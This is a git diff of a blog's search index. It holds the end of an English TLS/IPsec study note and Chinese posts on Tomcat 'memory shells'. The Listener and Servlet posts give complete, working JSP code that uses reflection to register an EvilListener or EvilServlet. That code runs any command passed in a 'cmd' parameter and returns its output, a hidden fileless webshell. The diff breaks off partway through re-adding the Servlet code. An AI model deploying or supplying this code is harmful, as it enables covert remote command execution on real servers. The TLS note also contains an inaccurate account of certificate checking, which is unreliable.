-<p>Eventhough the client verified the certificate, the attcker has no idea what the private key of the server, so he cannot decrypt the key transport and also cannot get the shared key generated later.</p>
-<h3 id="Scenario-2"><a href="#Scenario-2" class="headerlink" title="Scenario 2"></a>Scenario 2</h3><p>Attacker sends client a fake certificate for google.com, will client uses the fake public key to generate a symmetric key?</p>
-<p><strong>Solution</strong></p>
-<p>After receiving the fake certificate, client would look up from the online public database for the public key of the certificate received to verify the certificate. Obviously, the certificate is fake and the website will then be labelled as not secure and the attack failed.</p>
-<h2 id="Common-Attacks"><a href="#Common-Attacks" class="headerlink" title="Common Attacks"></a>Common Attacks</h2><h3 id="SSL-Stripping-Attack"><a href="#SSL-Stripping-Attack" class="headerlink" title="SSL Stripping Attack"></a>SSL Stripping Attack</h3><p>Attacker modifies web traffic to trick a client into accepting http connection instead of https </p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612172551.png" alt="SSL stripping attack"></p>
-<p><strong>Countermeasure</strong></p>
-<p>Server tells browser upon first visit to only accept HTTPS(not HTTP) for future requests to this domain.</p>
-<h3 id="BEASAT-POODLE"><a href="#BEASAT-POODLE" class="headerlink" title="BEASAT/POODLE"></a>BEASAT/POODLE</h3><p>Browser Exploit Against SSL/TLS / Padding Oracle On Downgraded Legacy</p>
-<ul>
-<li>Attacker exploits Bugs in encryption/MAC mode of operation algorithm in TLS 1.0 to extract information on secret key.</li>
-</ul>
-<p><strong>Countermeasure</strong></p>
-<p>Patches to TLS algorithms/implementations.</p>
-<h3 id="Compression-ratio-info-leak-Made-Easy-CRIME"><a href="#Compression-ratio-info-leak-Made-Easy-CRIME" class="headerlink" title="Compression ratio info-leak Made Easy(CRIME)"></a>Compression ratio info-leak Made Easy(CRIME)</h3><p>TLS has a compress-then-encrypt mode; Compressed data length no hidden by encryption, reveals information to attacker on secret web site cookies. </p>
-<p><strong>Countermeasure</strong></p>
-<p>Disable TLS compression, avoid if possible record layer compression.</p>
-<h1 id="IPsec-Protocol"><a href="#IPsec-Protocol" class="headerlink" title="IPsec Protocol"></a>IPsec Protocol</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>IPsec</code> stands for <strong>Internet Protocol Security</strong>, and is common used by VPN(<strong>Virtual Private Network</strong>).</p>
-<h2 id="IPsec-methods"><a href="#IPsec-methods" class="headerlink" title="IPsec methods"></a>IPsec methods</h2><h3 id="AH-Authentication-Header"><a href="#AH-Authentication-Header" class="headerlink" title="AH - Authentication Header"></a>AH - Authentication Header</h3><p>AH can only authenticate data, and it cannot encrypt data. It adds an Authentication after the <strong>original IP header</strong>. AH authenticate the whole IP packet.</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204412.png" alt="authentication header"></p>
-<p><strong>Security parameters index</strong>: point to entry corresponding to browser/server; includes info on shared key.</p>
-<p><strong>Sequence Number</strong> is used for freshness vs replay attacks</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204929.png" alt="AH example"></p>
-<h3 id="ESP-Encapsulating-Security-Payload"><a href="#ESP-Encapsulating-Security-Payload" class="headerlink" title="ESP - Encapsulating Security Payload"></a>ESP - Encapsulating Security Payload</h3><p><strong>ESP supports both Authentication and Encryption.</strong> However, ESP does not encrypt and authenticate the IP header.</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205320.png" alt="ESP"></p>
-<h2 id="Modes"><a href="#Modes" class="headerlink" title="Modes"></a>Modes</h2><ul>
-<li><strong>Transport Mode</strong><ul>
-<li>IP packet inserted with IPsec header(AH header/ESP header)</li>
-</ul>
-</li>
-<li><strong>Tunnel Mode</strong><ul>
-<li><strong>original packet preserved</strong> incl original header, new header added/prepended(at the begining of the whole packet)</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205922.png" alt="modes"></p>
-<h1 id="PAN"><a href="#PAN" class="headerlink" title="PAN"></a>PAN</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>PAN</code> stands for <strong>Personal Area Network</strong>. This technique is mainly used by Bluetooth. </p>
-<p><strong>Bluetooth’s Secure Connections</strong></p>
-<blockquote>
-<p>leverage on <strong>human channel</strong> during pairing, e.g.</p>
-<ul>
-<li><p>compare passkey on both devices</p>
-</li>
-<li><p>see passkey on one, type into the other</p>
-</li>
-<li><p>type same passkey into both</p>
-</li>
-<li><p>which option, depends on device I/O capability </p>
-</li>
-</ul>
-</blockquote>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
-<p><a href="https://blog.csdn.net/qq_38265137/article/details/89423551">https://blog.csdn.net/qq_38265137/article/details/89423551</a></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-      </categories>
-      <tags>
-        <tag>Web Security</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入文件读写问题</title>
     <url>/2021/07/04/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<h1 id="SQL注入中的文件读写问题"><a href="#SQL注入中的文件读写问题" class="headerlink" title="SQL注入中的文件读写问题"></a>SQL注入中的文件读写问题</h1><p>在SQLilab第七关中遇到了文件写不出来的问题，经过查询资料，最后终于解决问题，总结如下</p>
@@ -10266,306 +10266,6 @@ echo(serialize(new Windows()));
       </tags>
   </entry>
   <entry>
-    <title>Tomcat内存马系列(三):Servlet型</title>
-    <url>/2021/12/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%89-Servlet%E5%9E%8B/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在掌握了Listener内存马的实现后，Servlet型内存马的实现也变得很简单。此篇笔记主要讲解了构造Servlet型内存马的流程。</p>
-<span id="more"></span>
-
-<h1 id="探究Servlet的创建流程"><a href="#探究Servlet的创建流程" class="headerlink" title="探究Servlet的创建流程"></a>探究Servlet的创建流程</h1><p>同样是创建一个HomeServlet，并将Class的开头与doGet()的地方打上断点</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134250716.png" alt="image-20211230134250716"></p>
-<p>同时在web.xml中添加上</p>
-<pre><code class="xml">    &lt;servlet&gt;
-        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
-        &lt;servlet-class&gt;HomeServlet&lt;/servlet-class&gt;
-    &lt;/servlet&gt;
-    &lt;servlet-mapping&gt;
-        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
-        &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
-    &lt;/servlet-mapping&gt;
-</code></pre>
-<p>运行服务器后发现 第一个断点会在访问<code>/home</code>后断下，因此我们断点，servlet是在server收到请求后创建的。</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134515772.png" alt="image-20211230134515772"></p>
-<p>在<code>StandardWrapper</code>中，loadServlet()方法中创建了一个servlet</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134614746.png" alt="image-20211230134614746"></p>
-<p>那么如果我们将<code>this.servletClass</code>改成恶意Servlet，那么恶意Servlet就会被创建。</p>
-<h1 id="构造Servlet内存马的创建代码"><a href="#构造Servlet内存马的创建代码" class="headerlink" title="构造Servlet内存马的创建代码"></a>构造Servlet内存马的创建代码</h1><p>现在已经知道要修改StandardWrapper中的servletClass，但要想修改，就得先获取到StandardWrapper对象。</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134947343.png" alt="image-20211230134947343"></p>
-<p><code>StandardWrapper</code>继承了<code>ServletConfig</code>，而<code>ServletConfig</code>是可以直接被我们所获取得，其保存了当前Servlet的配置信息。</p>
-<p>因此我们可以直接在jsp中进行获取。</p>
-<p>需要注意的是，jsp中获取到的作用域都是<code>Facade</code>类型(如果直接写成StandardWrapperFacade类型会报错)</p>
-<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-</code></pre>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135326053.png" alt="image-20211230135326053"></p>
-<p>可以发现在构造方法中，StandardWrapper类型的context被赋值给了类属性<code>context</code></p>
-<p>因此我们可以用反射的方法来获取到context</p>
-<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
-  stdWrapperField.setAccessible(true);
-  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
-</code></pre>
-<p>获取到standardWrapper后，就可以设置相应的servlet了</p>
-<pre><code class="java">stdWrapper.setServlet(new EvilServlet());
-</code></pre>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135525495.png" alt="image-20211230135525495"></p>
-<p>因此完整的注册内存马代码如下</p>
-<pre><code class="java">&lt;%
-  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
-  stdWrapperField.setAccessible(true);
-  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
-  stdWrapper.setServlet(new EvilServlet());
-%&gt;
-</code></pre>
-<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><pre><code class="java">  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
-    @Override
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      super.doPost(req, resp);
-    &#125;
-
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      String cmd = req.getParameter(&quot;cmd&quot;);
-      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-      int i=0;
-      byte[] bytes=new byte[1024];
-      while ((i=inputStream.read(bytes))!=-1)&#123;
-        resp.getWriter().write(new String(bytes,0,i));
-        resp.getWriter().write(&quot;\r\n&quot;);
-      &#125;
-    &#125;
-  &#125;
-</code></pre>
-<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapperFacade&quot; %&gt;
-&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
-&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%--
-  Created by IntelliJ IDEA.
-  User: leihehe
-  Date: 30/12/2021
-  Time: 09:22
-  To change this template use File | Settings | File Templates.
---%&gt;
-&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
-&lt;%!
-  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
-    @Override
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      super.doPost(req, resp);
-    &#125;
-
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
-      String cmd = req.getParameter(&quot;cmd&quot;);
-      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-      int i=0;
-      byte[] bytes=new byte[1024];
-      while ((i=inputStream.read(bytes))!=-1)&#123;
-        resp.getWriter().write(new String(bytes,0,i));
-        resp.getWriter().write(&quot;\r\n&quot;);
-      &#125;
-    &#125;
-  &#125;
-%&gt;
-
-&lt;%
-  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
-  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
-  stdWrapperField.setAccessible(true);
-  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
-  stdWrapper.setServlet(new EvilServlet());
-%&gt;
-</code></pre>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230140132389.png" alt="image-20211230140132389"></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-        <category>Java内存马</category>
-      </categories>
-      <tags>
-        <tag>Web Security</tag>
-        <tag>内存马</tag>
-        <tag>Tomcat</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tomcat内存马系列(二):Listener型</title>
-    <url>/2021/12/29/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%BA%8C-Listener%E5%9E%8B/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Listener型内存马分析起来比Filter型的要简单很多，在监听到请求后自动触发。学习了<strong>JavaWeb</strong>后再来看这些其实都并不难。</p>
-<p>此文展示了我在不借助网上的Listener内存马资料下完成Listener内存马构造的过程。</p>
-<span id="more"></span>
-
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先创建一个servlet项目。引入Tomcat中的<strong>servlet-api.jar、tomcat-api.jar及catalina.jar</strong></p>
-<h1 id="内存马流程分析"><a href="#内存马流程分析" class="headerlink" title="内存马流程分析"></a>内存马流程分析</h1><h2 id="listener类型"><a href="#listener类型" class="headerlink" title="listener类型"></a>listener类型</h2><p>学过servlet的话应该知道，listener分为以下类型：</p>
-<ul>
-<li>ServletRequestListener - 对每次请求进行监听</li>
-<li>ServletContextListener -只会在服务器启动或者关闭时触发</li>
-<li>ServletSessionListener - 在创建、销毁session登情况触发。</li>
-</ul>
-<p>显而易见，我们选择使用ServletRequestListener类型的listener比较合适，因为其可以监听每次request的执行与销毁；</p>
-<h2 id="探究listener的注册与执行"><a href="#探究listener的注册与执行" class="headerlink" title="探究listener的注册与执行"></a>探究listener的注册与执行</h2><p>接下来，我们随意创建一个<code>TestListener</code></p>
-<pre><code class="java">import javax.servlet.ServletRequestEvent;
-import javax.servlet.ServletRequestListener;
-
-public class TestListener implements ServletRequestListener &#123;
-    @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
-
-    &#125;
-    @Override
-    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;
-        System.out.println(&quot;evil code&quot;);
-    &#125;
-&#125;
-</code></pre>
-<p>将他加入web.xml</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229151841950.png" alt="image-20211229151841950"></p>
-<p>现在来探究一个正常的Listener被执行的流程</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152257919.png" alt="image-20211229152257919"></p>
-<p>在Class被创建的地方下个断点，再在代码执行的地方下个断点。</p>
-<p>发现了关键的地方 <code>listenerStart()</code></p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152439542.png" alt="image-20211229152439542"></p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152524318.png" alt="image-20211229152524318"></p>
-<p>继续跟进<code>findApplicationListeners()</code></p>
-<pre><code class="java">public String[] findApplicationListeners() &#123;
-    return this.applicationListeners;
-&#125;
-</code></pre>
-<p>由此可见，如果我们修改了<code>StandardContext</code>的<code>applicationListeners</code>属性，就可以让我们自己构造的恶意Listener加载进去。</p>
-<p>那么怎么能够获取到<code>StandardContext</code>呢？</p>
-<p>这里可能要一些前置知识：<strong>每一个项目都有一个ServletContext, ServletContext是全局共享的，也就是说所有的Servlet都可以访问这一个ServletContext，而ServletContext中往往保存上下文内可以访问的其他servlet的属性</strong></p>
-<p>那么<code>StandardContext</code>可能就在<code>ServletContext</code>中，而我们可以通过request来获取到ServletContext。</p>
-<p>我们在自己创建的<strong>HomeServlet</strong>中获取ServletContext并下个断点，重新运行看看</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153455331.png" alt="image-20211229153455331"></p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153607771.png" alt="image-20211229153607771"></p>
-<p>获取后发现，servletContext中有一个applicationContext，其中包含了StandardContext，我们可以通过这里获取。</p>
-<h1 id="手动注册内存马"><a href="#手动注册内存马" class="headerlink" title="手动注册内存马"></a>手动注册内存马</h1><p>那么我们可以用反射的方式来获取到StandardContext</p>
-<p>Tomcat在处理jsp页面的时候，实际上创建一个servlet，并把jsp中的代码翻译生成到该servlet中，因此我们下面的演示直接在自己创建的<code>HomeServlet.java</code>中执行</p>
-<pre><code class="java">ServletContext servletContext = request.getServletContext();
-Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
-stdFiled.setAccessible(true);
-ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
-Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
-standardFld.setAccessible(true);
-StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
-</code></pre>
-<p>接下来我们依然要用反射的方式获取到其<code>applicationListeners</code>属性，并将我们的恶意Listener放在最前面</p>
-<pre><code class="java">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
-applicationEventListeners.add(0,new TestListener());
-</code></pre>
-<p>到这里报错了</p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229154211578.png" alt="image-20211229154211578"></p>
-<p>看起来是add方法出了问题。</p>
-<blockquote>
-<p>Array内部的ArrayList没有重写AbstractList的add（xxx），导致我们上诉代码调用的add（xxx）其实是直接调用AbstractList类的add（xxx），所以直接抛出了异常UnsupportedOperationException。</p>
-</blockquote>
-<p>那么直接换成ArrayList即可</p>
-<pre><code class="java">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
-List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
-arrayList.add(0,new TestListener());
-</code></pre>
-<p>最后将新建的arrayList重新赋值给<code>applicationEventListeners</code>，恰好有个这样的方法</p>
-<pre><code class="java">standardContext.setApplicationEventListeners(arrayList.toArray());
-</code></pre>
-<p><strong>整个注册内存马的过程：</strong></p>
-<pre><code class="java">ServletContext servletContext = request.getServletContext();
-Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
-stdFiled.setAccessible(true);
-ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
-Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
-standardFld.setAccessible(true);
-StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
-
-List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
-List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
-arrayList.add(0,new TestListener());
-standardContext.setApplicationEventListeners(arrayList.toArray());
-</code></pre>
-<h1 id="构造恶意内存马"><a href="#构造恶意内存马" class="headerlink" title="构造恶意内存马"></a>构造恶意内存马</h1><p>构造内存马，直接把上面的注册过程写到jsp页面，然后在jsp页面写一个<code>&lt;%! 方法%&gt;</code>就可以了。</p>
-<p>需要注意的是，重写的<code>ServletRequestListener</code>的类方法<code>public void requestInitialized(ServletRequestEvent servletRequestEvent)</code>中，只有参数<code>servletRequestEvent</code>，而没有response。 如果我们想使用内存马，最好是能够有回显。</p>
-<p>在<strong>Request</strong>类中，我们可以得到response，而Request类是<strong>RequestFacade</strong>类中的属性<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165853415.png" alt="image-20211229165853415"></p>
-<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165807812.png" alt="image-20211229165807812"></p>
-<p>只要能够得到RequestFacade中的request属性，就能得到response object，所以我们直接用反射的方法来完成。</p>
-<p><strong>完整构造</strong>：</p>
-<pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
-&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
-&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
-&lt;%@ page import=&quot;java.util.List&quot; %&gt;
-&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;
-&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
-&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;
-&lt;%--
-  Created by IntelliJ IDEA.
-  User: leihehe
-  Date: 29/12/2021
-  Time: 15:52
-  To change this template use File | Settings | File Templates.
---%&gt;
-&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
-&lt;%!
-
-    class EvilListener implements ServletRequestListener&#123;
-
-        @Override
-        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
-
-        &#125;
-
-        @Override
-        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;
-            try &#123;
-                ServletRequest servletRequest = servletRequestEvent.getServletRequest();
-                String cmd = servletRequest.getParameter(&quot;cmd&quot;);
-                RequestFacade requestFacade = (RequestFacade) servletRequest;
-                Field requestField = requestFacade.getClass().getDeclaredField(&quot;request&quot;);
-                requestField.setAccessible(true);
-                Request request = (Request)requestField.get(requestFacade);
-                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-                int i = 0;
-                byte[] bytes = new byte[1024];
-                while ((i=inputStream.read(bytes)) != -1)&#123;
-                    request.getResponse().getWriter().write(new String(bytes,0,i));
-                    request.getResponse().getWriter().write(&quot;\r\n&quot;);
-                &#125;
-            &#125; catch (IOException | NoSuchFieldException | IllegalAccessException e) &#123;
-                e.printStackTrace();
-            &#125;
-        &#125;
-    &#125;
-
-%&gt;
-
-&lt;%
-    ServletContext servletContext = request.getServletContext();
-    Field stdFiled=servletContext.getClass().getDeclaredField(&quot;context&quot;);
-    stdFiled.setAccessible(true);
-    ApplicationContext aplContext = (ApplicationContext) stdFiled.get(servletContext);
-    Field standardFld = aplContext.getClass().getDeclaredField(&quot;context&quot;);
-    standardFld.setAccessible(true);
-    StandardContext standardContext = (StandardContext) standardFld.get(aplContext);
-
-    List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
-    List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
-    arrayList.add(0,new EvilListener());
-    standardContext.setApplicationEventListeners(arrayList.toArray());
-%&gt;
-</code></pre>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_31772441/article/details/80095037">调用list.add方法报错（java.lang.UnsupportedOperationException）</a></p>
-]]></content>
-      <categories>
-        <category>Web Security</category>
-        <category>Java内存马</category>
-      </categories>
-      <tags>
-        <tag>Web Security</tag>
-        <tag>内存马</tag>
-        <tag>Tomcat</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Tomcat内存马系列(一):Filter型</title>
     <url>/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着这些年来各种安全防护手段的出现，想要上传一个文件类型的<strong>webshell</strong>从而拿到权限更难上加难。但最近横空出世的内存马因为隐蔽性高，逐渐被大众所知。</p>
@@ -10994,6 +10694,306 @@ if (filterConfigs.get(name) == null)&#123;//判断我们自己设定filter名字
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na">https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na</a></p>
 <p><a href="https://blog.csdn.net/lqzkcx3/article/details/79357144">https://blog.csdn.net/lqzkcx3/article/details/79357144</a></p>
 <p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>Java内存马</category>
+      </categories>
+      <tags>
+        <tag>Web Security</tag>
+        <tag>内存马</tag>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat内存马系列(三):Servlet型</title>
+    <url>/2021/12/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%89-Servlet%E5%9E%8B/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在掌握了Listener内存马的实现后，Servlet型内存马的实现也变得很简单。此篇笔记主要讲解了构造Servlet型内存马的流程。</p>
+<span id="more"></span>
+
+<h1 id="探究Servlet的创建流程"><a href="#探究Servlet的创建流程" class="headerlink" title="探究Servlet的创建流程"></a>探究Servlet的创建流程</h1><p>同样是创建一个HomeServlet，并将Class的开头与doGet()的地方打上断点</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134250716.png" alt="image-20211230134250716"></p>
+<p>同时在web.xml中添加上</p>
+<pre><code class="xml">    &lt;servlet&gt;
+        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;HomeServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;HomeServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+</code></pre>
+<p>运行服务器后发现 第一个断点会在访问<code>/home</code>后断下，因此我们断点，servlet是在server收到请求后创建的。</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134515772.png" alt="image-20211230134515772"></p>
+<p>在<code>StandardWrapper</code>中，loadServlet()方法中创建了一个servlet</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134614746.png" alt="image-20211230134614746"></p>
+<p>那么如果我们将<code>this.servletClass</code>改成恶意Servlet，那么恶意Servlet就会被创建。</p>
+<h1 id="构造Servlet内存马的创建代码"><a href="#构造Servlet内存马的创建代码" class="headerlink" title="构造Servlet内存马的创建代码"></a>构造Servlet内存马的创建代码</h1><p>现在已经知道要修改StandardWrapper中的servletClass，但要想修改，就得先获取到StandardWrapper对象。</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230134947343.png" alt="image-20211230134947343"></p>
+<p><code>StandardWrapper</code>继承了<code>ServletConfig</code>，而<code>ServletConfig</code>是可以直接被我们所获取得，其保存了当前Servlet的配置信息。</p>
+<p>因此我们可以直接在jsp中进行获取。</p>
+<p>需要注意的是，jsp中获取到的作用域都是<code>Facade</code>类型(如果直接写成StandardWrapperFacade类型会报错)</p>
+<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+</code></pre>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135326053.png" alt="image-20211230135326053"></p>
+<p>可以发现在构造方法中，StandardWrapper类型的context被赋值给了类属性<code>context</code></p>
+<p>因此我们可以用反射的方法来获取到context</p>
+<pre><code class="java">  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
+  stdWrapperField.setAccessible(true);
+  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
+</code></pre>
+<p>获取到standardWrapper后，就可以设置相应的servlet了</p>
+<pre><code class="java">stdWrapper.setServlet(new EvilServlet());
+</code></pre>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211230135525495.png" alt="image-20211230135525495"></p>
+<p>因此完整的注册内存马代码如下</p>
+<pre><code class="java">&lt;%
+  StandardWrapperFacade stdWrapperFacade = (StandardWrapperFacade) config;
+  Field stdWrapperField = stdWrapperFacade.getClass().getDeclaredField(&quot;config&quot;);
+  stdWrapperField.setAccessible(true);
+  StandardWrapper stdWrapper = (StandardWrapper) stdWrapperField.get(stdWrapperFacade);
+  stdWrapper.setServlet(new EvilServlet());
+%&gt;
+</code></pre>
+<h1 id="构造Servlet内存马恶意代码的构造"><a href="#构造Servlet内存马恶意代码的构造" class="headerlink" title="构造Servlet内存马恶意代码的构造"></a>构造Servlet内存马恶意代码的构造</h1><pre><code class="java">  public class EvilServlet extends javax.servlet.http.HttpServlet&#123;
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      super.doPost(req, resp);
+    &#125;
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+      String cmd = req.getParameter(&quot;cmd&quot;);
+      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+      int i=0;
+      byte[] bytes=new byte[1024];
+      while ((i=inputStream.read(bytes))!=-1)&#123;
+        resp.getWriter().write(new String(bytes,0,i));
+        resp.getWriter().write(&quot;\r\n&quot;);
+      &#125;
+    &#125;
+  &#125;
